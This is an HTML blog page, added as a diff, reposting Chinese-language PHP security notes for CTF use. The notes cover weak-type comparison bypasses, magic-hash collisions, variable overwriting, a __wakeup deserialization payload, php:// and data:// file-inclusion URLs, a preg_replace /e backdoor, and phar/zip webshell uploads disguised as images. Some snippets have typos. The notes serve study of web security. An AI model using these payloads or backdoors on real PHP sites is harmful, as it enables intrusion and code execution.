@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    Rain
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="Rainer">
+<meta name="description" content="hi&lt;(＃￣▽￣＃)&gt;">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://rainerhu.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+                                <script async src="https://www.googletagmanager.com/gtag/js?id=G-9DZS1ZZFGF"></script>
+                                <script>
+                                    window.dataLayer = window.dataLayer || [];
+
+                                    function gtag() {
+                                        dataLayer.push(arguments);
+                                    }
+                                    gtag('js', new Date());
+                                    gtag('config', 'G-9DZS1ZZFGF');
+                                </script>
+                                
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://rainerhu.github.io">
+                    Rain
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1687779481197" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://rainerhu.github.io">
+                            Rain
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1687779481197" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                php
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            Rain
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2017-10-26</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">14.3
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">3340</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://rainerhu.github.io/tag/f81tfGuJr/">php</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <ul>
+<li>原文连接<a href="http://www.restran.net/2016/09/26/php-security-notes/">http://www.restran.net/2016/09/26/php-security-notes/</a><br>
+copy用于方便查阅</li>
+</ul>
+<h1 id="系统变量">系统变量</h1>
+<pre><code class="language-php">$_POST // 获取 post 数据，是一个字典
+$_GET // 获取 get 数据，是一个字典
+$_COOKIE // 获取 cookie
+$_SESSION // 获取 session
+$_FILE // 获取上传的文件
+$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据
+</code></pre>
+<!-- more -->
+<h1 id="错误控制运算符">错误控制运算符</h1>
+<p><strong>@</strong> 当其放置在一个php表达式前,该表达式可能产生的错误信息都被忽略</p>
+<h1 id="变量默认值">变量默认值</h1>
+<p>定义一个变量,如果不设置值,默认为0</p>
+<h1 id="_get和_post"><code>$_GET</code>和<code>$_POST</code></h1>
+<p>如果在GET参数中设置<code>name[]=a</code>,那么<code>$_GET['name'] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用<code>urldecode</code>。<br>
+<code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST['user']</code> 得到的是 <code>['admin']</code> 是一个数组。</p>
+<h1 id="内置函数的松散性">内置函数的松散性</h1>
+<h2 id="strcmp">strcmp</h2>
+<blockquote>
+<p>如果 str1 小于 str2 返回 &lt; 0；<br>
+如果 str1 大于 str2 返回 &gt; 0；<br>
+如果两者相等，返回 0。</p>
+</blockquote>
+<ul>
+<li>5.2 中是将两个参数先转换成string类型。</li>
+<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
+<li>5.5 中如果参数不是string类型，直接return</li>
+</ul>
+<pre><code class="language-php">$array=[1, 2, 3];
+// 数组跟字符串比较会返回 0
+//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等
+var_dump(strcmp($array, 'abc'));
+</code></pre>
+<h2 id="sha1-和-md5-函数">sha1 和 md5 函数</h2>
+<p>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</p>
+<pre><code class="language-php">sha1([]) === false
+md5([]) === false
+</code></pre>
+<h2 id="弱类型">弱类型</h2>
+<p>当一个整形和一个其他类型行比较的时候，会先把其他类型 <code>intval</code> 再比较</p>
+<h2 id="intval">intval</h2>
+<p>intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。</p>
+<pre><code class="language-php">var_dump(intval('2')) // 2
+var_dump(intval('3abcd')) // 3
+var_dump(intval('abcd')) // 0
+</code></pre>
+<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union…</code></p>
+<pre><code class="language-php">if(intval($a) &gt; 1000) {
+    mysql_query(&quot;select * from news where id=&quot;.$a)
+}
+</code></pre>
+<h2 id="is_numeric">is_numeric</h2>
+<p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
+<pre><code class="language-php">&lt;?php
+echo is_numeric(233333);       # 1
+echo is_numeric('233333');    # 1
+echo is_numeric(0x233333);    # 1
+echo is_numeric('0x233333');   # 1
+echo is_numeric('233333abc');  # 0
+?&gt;
+</code></pre>
+<h2 id="in_array">in_array</h2>
+<p>in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：</p>
+<pre><code class="language-php">in_array('b', array('a', 'b', 'c');
+</code></pre>
+<p>这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，<code>typeid=1’ union select..</code> 也能通过 in_array 的验证</p>
+<pre><code class="language-php">if (in_array($_GET('typeid'], array(1, 2, 3, 4))) {
+    $sql=&quot;select …. where typeid=&quot;.$_GET['typeid']&quot;;
+    echo $sql;
+}
+</code></pre>
+<h1 id="array_search">array_search()</h1>
+<p>PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。<br>
+array_search 会使用'ctf'和array中的每个值作比较，而且intval('ctf')==0.,</p>
+<pre><code class="language-php">if(is_array(@$a[&quot;a2&quot;])){
+        if(count($a[&quot;a2&quot;])!==5 OR !is_array($a[&quot;a2&quot;][0])) die(&quot;nope&quot;);
+        $pos = array_search(&quot;ctf&quot;, $a[&quot;a2&quot;]);
+        $pos===false?die(&quot;nope&quot;):NULL;
+        foreach($a[&quot;a2&quot;] as $key=&gt;$val){
+            $val===&quot;ctf&quot;?die(&quot;nope&quot;):NULL;
+        }
+        $v2=1;
+    }
+</code></pre>
+<h2 id="和"><mark>和</mark>=</h2>
+<ul>
+<li><code>==</code>是弱类型的比较</li>
+<li><code>===</code>比较符则可以避免这种,隐式转换,除了检查值还检查类型<br>
+以下比较的结果都为 true</li>
+</ul>
+<pre><code class="language-php">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc
+// 十六进制与整数，被转换为同一进制比较
+'0xccccccccc' == '54975581388'
+
+// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0
+1 == '1'
+1 == '01'
+10 == '1e1'
+100 == '1e2'
+0 == 'a' // a 转换为数字为 0
+
+// 十六进制数与带空格十六进制数，被转换为十六进制整数
+'0xABCdef' == '     0xABCdef'
+'0010e2' == '1e3'
+</code></pre>
+<h2 id="hash-比较的问题-hash碰撞">hash 比较的问题 hash碰撞</h2>
+<p>0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。</p>
+<pre><code class="language-php">// '0e5093234' 为 0，'0eabc3234' 不为 0
+
+// true
+'0e509367213418206700842008763514' == '0e481036490867661113260034900752'
+// true
+'0e481036490867661113260034900752' == '0'
+
+// false
+var_dump('0' == '0e1abcd');
+// true
+var_dump(0 == '0e1abcd');
+
+var_dump(md5('240610708') == md5('QNKCDZO'));
+var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
+var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
+var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
+</code></pre>
+<p>如果要找出 <code>0e </code>开头的 hash 碰撞，可以用如下代码</p>
+<pre><code class="language-php">&lt;?php
+
+$salt = 'vunp';
+$hash = '0e612198634316944013585621061115';
+
+for ($i=1; $i&lt;100000000000; $i++) {
+    if (md5($salt . $i) == $hash) {
+        echo $i;
+        break;
+    }
+}
+
+echo '  done';
+</code></pre>
+<h2 id="switch">switch</h2>
+<p>如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int<br>
+类型。</p>
+<pre><code class="language-php">$i =&quot;2abc&quot;;
+switch ($i)  {
+    case 0:
+    case 1:
+    case 2:
+        echo &quot;i is less than 3 but not negative&quot;;
+        break;
+    case 3:
+        echo &quot;i is 3&quot;;
+}
+</code></pre>
+<p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 $i 进行了类型转换，转换结果为 2。</p>
+<h1 id="正则表达式">正则表达式</h1>
+<h2 id="preg_matc">preg_matc</h2>
+<p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code>和 <code>$</code>)，则可以存在绕过的问题</p>
+<pre><code class="language-php">$ip = '1.1.1.1 abcd'; // 可以绕过
+if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) {
+  die('error');
+} else {
+  // echo('key...')
+}
+</code></pre>
+<h2 id="ereg-00-截断">ereg %00 截断</h2>
+<p>ereg 读到 %00 的时候，就截止了</p>
+<pre><code class="language-php">&lt;?php
+    if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET['a']) === FALSE)  {
+        echo 'You password must be alphabet';
+    }
+?&gt;
+</code></pre>
+<p>这里 <code>a=abcd%001234</code>，可以绕过</p>
+<h1 id="变量覆盖">变量覆盖</h1>
+<h2 id="extract">extract</h2>
+<p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
+<pre><code class="language-php">&lt;?php  
+    $auth = '0';  
+    // 这里可以覆盖$auth的变量值
+    extract($_GET);
+    if($auth == 1){  
+        echo &quot;private!&quot;;  
+    } else{  
+        echo &quot;public!&quot;;  
+    }  
+?&gt;
+//GET举例 playload:?gift=flag&amp;flag=php://input
+&lt;?php     
+$flag='mail.txt';     
+extract($_GET);     // 这里可以覆盖
+if(isset($gift))
+{        
+	$content=trim(file_get_contents($flag));
+	echo $content;
+    if($gift==$content){
+		echo'flag';     
+		}
+	else{       
+		echo'flag被加密了 再加密一次就得到flag了';
+		}   
+}
+?&gt;
+</code></pre>
+<h2 id="parse_str">parse_str</h2>
+<p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
+<pre><code class="language-php">//var.php?var=new  
+$var='init';  
+parse_str($_SERVER['QUERY_STRING']);
+// $var 会变成 new
+echo $var;
+</code></pre>
+<h2 id="import_request_variables变量覆盖"><code>import_request_variables()</code>变量覆盖</h2>
+<pre><code class="language-php">//1.php?a=1  返回 true!
+&lt;?php  
+$a = '0';  
+import_request_variables('G');  
+
+if($a == 1){  
+  echo &quot;true!&quot;;  
+}else{  
+  echo &quot;false!&quot;;  
+}  
+?&gt;
+</code></pre>
+<p><code>import_request_variables()</code>，将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</p>
+<h2 id="变量覆盖-2">$$ 变量覆盖</h2>
+<p>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题</p>
+<pre><code class="language-php">$_ = '_POST';
+// $$_ 是等于 $_POST
+例一:
+&lt;?php
+$id=1;
+foreach (array('_GET','_POST') as $request) {    
+          foreach ($$request as $key =&gt; $value) {        
+                    echo $key.&quot;   &quot;.$value.&quot;&lt;/br&gt;&quot;;        
+                    ${$key}=$value;        //echo $$key;    
+                  }
+          }
+echo $id;
+?&gt;
+例二:
+&lt;?php
+    $a='hello';
+    foreach($_GET as $key =&gt; $value{
+        $$key = $value;
+    }
+ print $a;
+ ?&gt;
+</code></pre>
+<p>这里会先把<code>$key</code>输出来，让你明确是如何覆盖和覆盖了什么，像当前文件提交<code>index.php?id=xxxx</code>,就可以覆盖掉$id的值。</p>
+<h2 id="unset">unset</h2>
+<p><code>unset($bar);</code> 用来销毁指定的变量，如果变量 $bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过</p>
+<pre><code class="language-php">// http://127.0.0.1/index.php?_CONFIG=123
+$_CONFIG['extraSecure'] = true;
+
+foreach(array('_GET','_POST') as $method) {
+    foreach($$method as $key=&gt;$value) {
+      // $key == _CONFIG
+      // $$key == $_CONFIG
+      // 这个函数会把 $_CONFIG 变量销毁
+      unset($$key);
+    }
+}
+
+if ($_CONFIG['extraSecure'] == false) {
+    echo 'flag {****}';
+}
+</code></pre>
+<h1 id="特殊的-php-代码格式">特殊的 PHP 代码格式</h1>
+<ul>
+<li>.php2</li>
+<li>.php3</li>
+<li>.php4</li>
+<li>.php5</li>
+<li>.php7</li>
+<li>.phtml<br>
+正则检测文件内容中包含 <code>&lt;?</code> 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过</li>
+</ul>
+<pre><code class="language-php">&lt;script language=&quot;php&quot;&gt;
+echo base64_encode(file_get_contents('flag.php'));
+&lt;/script&gt;
+</code></pre>
+<p>效果等于 echo ‘a’;</p>
+<pre><code class="language-php">&lt;?='a';?&gt;
+</code></pre>
+<p>如果在 php.ini 文件中配置允许 ASP 风格的标签</p>
+<pre><code class="language-php">Allow ASP-style &lt;% %&gt; tags.
+; http://php.net/asp-tags
+asp_tags = On
+</code></pre>
+<p>则可以使用该方式</p>
+<pre><code class="language-php">&lt;% echo 'a'; %&gt;
+</code></pre>
+<h1 id="伪随机数">伪随机数</h1>
+<h2 id="mt_rand">mt_rand()</h2>
+<p>mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。</p>
+<pre><code class="language-php">$seed = 12345;
+mt_rand($seed);
+
+$ss = mt_rand();
+</code></pre>
+<p>linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。<br>
+但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 <a href="http://www.openwall.com/php_mt_seed/">php_mt_seed</a>。</p>
+<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
+<h2 id="rand">rand()</h2>
+<p>rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/">这里</a>。产生的随机数可以用下面这个公式预测:</p>
+<pre><code>//一般预测值可能比实际值要差1
+state[i] = state[i-3] + state[i-31]
+</code></pre>
+<p>可以用下面的代码验证一下</p>
+<pre><code class="language-php">&lt;?php
+$randStr = array();
+for($i=0;$i&lt;50;$i++) {  //先产生 32个随机数
+    $randStr[$i]=rand(0,30);
+    if($i&gt;=31) {
+        echo  &quot;$randStr[$i]=(&quot;.$randStr[$i-31].&quot;+&quot;.$randStr[$i-3].&quot;) mod 31&quot;.&quot;\n&quot;;
+    }
+}
+?&gt;
+</code></pre>
+<h1 id="反序列化">反序列化</h1>
+<ul>
+<li><code>_construct()</code>：构造函数，当对象创建(new)时会自动调用。但在<code>unserialize()</code>时是不会自动调用的。</li>
+<li><code>__destruct()</code>：析构函数，当对象被销毁时会自动调用。</li>
+<li><code>__wakeup() </code>：如前所提，<code>unserialize()</code>时会自动调用。<br>
+PHP <code>unserialize()</code> 后会导致 <code>__wakeup()</code> 或 <code>__destruct()</code> 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 <code>__wakeup() </code>或 <code>__destruct()</code> 中。</li>
+</ul>
+<h1 id="__wakeup-函数绕过"><code>__wakeup</code> 函数绕过</h1>
+<p>PHP 有个 <a href="https://bugs.php.net/bug.php?id=72663">Bug</a>，如果反序列化出现问题，会不去执行 <code>__wakeup</code> 函数，例如：</p>
+<pre><code class="language-php">&lt;?php
+class xctf
+{
+    public $flag = &quot;111&quot;;
+    public function __wakeup()
+    {
+        exit('bad requests');
+    }
+}
+//echo serialize(new xctf());
+echo unserialize($_GET['code']);
+echo &quot;flag{****}&quot;;
+?&gt;
+</code></pre>
+<p>使用这个 payload 绕过 <code>__wakeup</code> 函数</p>
+<pre><code># O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}
+http://www.example.com/index.php?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}
+</code></pre>
+<p>在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 <code>__wakeup</code> 函数，从而绕过该函数。</p>
+<h1 id="文件包含">文件包含</h1>
+<pre><code>http://10.2.1.1:20770/index.php?page=upload
+这种 url 很容易就能想到可能是文件包含或者伪协议读取
+http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload
+</code></pre>
+<h1 id="命令执行">命令执行</h1>
+<h2 id="反引号">反引号`</h2>
+<p>反引号 ` 可以调用 shell_exec 正常执行代码</p>
+<pre><code>`$_GET['v']` 相当于 shell_exec($_GET['v'])
+</code></pre>
+<h2 id="preg_replace">preg_replace()</h2>
+<p>触发条件：</p>
+<ul>
+<li>第一个参数需要e标识符，有了它可以执行第二个参数的命令</li>
+<li>第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：</li>
+</ul>
+<pre><code class="language-php">// 这样是可以执行命令的
+echo preg_replace('/test/e', 'phpinfo()', 'just test');
+
+// 这种没有匹配上，所以返回值是第三个参数，不会执行命令
+echo preg_replace('/test/e', 'phpinfo()', 'just tesxt');
+</code></pre>
+<p>我们可以构造这样的后门代码</p>
+<pre><code class="language-php">@preg_replace(&quot;//e&quot;, $_GET['h'], &quot;Access Denied&quot;);  
+echo preg_replace(&quot;/test/e&quot;, $_GET[&quot;h&quot;], &quot;jutst test&quot;);
+</code></pre>
+<p>当访问这样这样的链接时就可以被触发</p>
+<pre><code class="language-url">http://localhost:8000/testbug.php?h=phpinfo();
+</code></pre>
+<h1 id="伪协议">伪协议</h1>
+<h2 id="phpfilter">php://filter</h2>
+<p>读取文件</p>
+<pre><code class="language-url">/lfi.php?file=php://filter/convert.base64-encode/resource=flag.php
+/lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<h2 id="phpinput">php://input</h2>
+<p>写入文件， 数据利用 POST 传过去</p>
+<pre><code class="language-url">/test.php?file=php://input
+</code></pre>
+<h2 id="data">data://</h2>
+<p>将 include 的文件流重定向到用户控制的输入流</p>
+<pre><code class="language-url">/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==
+//base64部分为:&lt;?php phpinfo();exit();//
+</code></pre>
+<p>可以用于控制 file_get_contents 的内容为用户输入的流</p>
+<pre><code class="language-php">$file=$_GET['file'];
+$data = @file_get_contents($a,'r');
+echo $data;
+</code></pre>
+<h2 id="phar">phar://</h2>
+<p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。</p>
+<p>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>
+这里的路径为上传的 jpg 文件在服务器的路径</p>
+<pre><code>/index.php?id=phar://路径/xxx.jpg/shell
+</code></pre>
+<h2 id="zip">zip://</h2>
+<p>上述 phar:// 的方法也可以使用 zip://</p>
+<p>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。</p>
+<p>1.zip文件内仅有1.php这个文件</p>
+<pre><code class="language-php">/php?file=zip://1.png%231.php  
+// 也可以尝试不改名为png，直接使用zip上传测试一下
+/php?file=zip://1.zip%231.php
+</code></pre>
+<h1 id="文件上传漏洞">文件上传漏洞</h1>
+<p>正常的文件上传流程是这样的，首先接收 <code>POST</code> 的文件，在 <code>tmp</code> 目录下生成临时文件，文件名是 <code>php[A-Za-z0-9]{6}</code>，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 <code>/tmp</code> 目录下可以留下任何内容。 内容构造好后，单纯爆破 <code>/tmp/phpxxxxxx</code> 文件名是不太现实但是也可行的。</p>
+<p>通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F">系统变量</a></li>
+<li><a href="#%E9%94%99%E8%AF%AF%E6%8E%A7%E5%88%B6%E8%BF%90%E7%AE%97%E7%AC%A6">错误控制运算符</a></li>
+<li><a href="#%E5%8F%98%E9%87%8F%E9%BB%98%E8%AE%A4%E5%80%BC">变量默认值</a></li>
+<li><a href="#_get%E5%92%8C_post"><code>$_GET</code>和<code>$_POST</code></a></li>
+<li><a href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E7%9A%84%E6%9D%BE%E6%95%A3%E6%80%A7">内置函数的松散性</a>
+<ul>
+<li><a href="#strcmp">strcmp</a></li>
+<li><a href="#sha1-%E5%92%8C-md5-%E5%87%BD%E6%95%B0">sha1 和 md5 函数</a></li>
+<li><a href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B">弱类型</a></li>
+<li><a href="#intval">intval</a></li>
+<li><a href="#is_numeric">is_numeric</a></li>
+<li><a href="#in_array">in_array</a></li>
+</ul>
+</li>
+<li><a href="#array_search">array_search()</a>
+<ul>
+<li><a href="#%E5%92%8C">==和===</a></li>
+<li><a href="#hash-%E6%AF%94%E8%BE%83%E7%9A%84%E9%97%AE%E9%A2%98-hash%E7%A2%B0%E6%92%9E">hash 比较的问题 hash碰撞</a></li>
+<li><a href="#switch">switch</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">正则表达式</a>
+<ul>
+<li><a href="#preg_matc">preg_matc</a></li>
+<li><a href="#ereg-00-%E6%88%AA%E6%96%AD">ereg %00 截断</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96">变量覆盖</a>
+<ul>
+<li><a href="#extract">extract</a></li>
+<li><a href="#parse_str">parse_str</a></li>
+<li><a href="#import_request_variables%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><code>import_request_variables()</code>变量覆盖</a></li>
+<li><a href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-2">$$ 变量覆盖</a></li>
+<li><a href="#unset">unset</a></li>
+</ul>
+</li>
+<li><a href="#%E7%89%B9%E6%AE%8A%E7%9A%84-php-%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F">特殊的 PHP 代码格式</a></li>
+<li><a href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>
+<ul>
+<li><a href="#mt_rand">mt_rand()</a></li>
+<li><a href="#rand">rand()</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
+<li><a href="#__wakeup-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><code>__wakeup</code> 函数绕过</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a>
+<ul>
+<li><a href="#%E5%8F%8D%E5%BC%95%E5%8F%B7">反引号`</a></li>
+<li><a href="#preg_replace">preg_replace()</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议</a>
+<ul>
+<li><a href="#phpfilter">php://filter</a></li>
+<li><a href="#phpinput">php://input</a></li>
+<li><a href="#data">data://</a></li>
+<li><a href="#phar">phar://</a></li>
+<li><a href="#zip">zip://</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">文件上传漏洞</a></li>
+</ul>
+
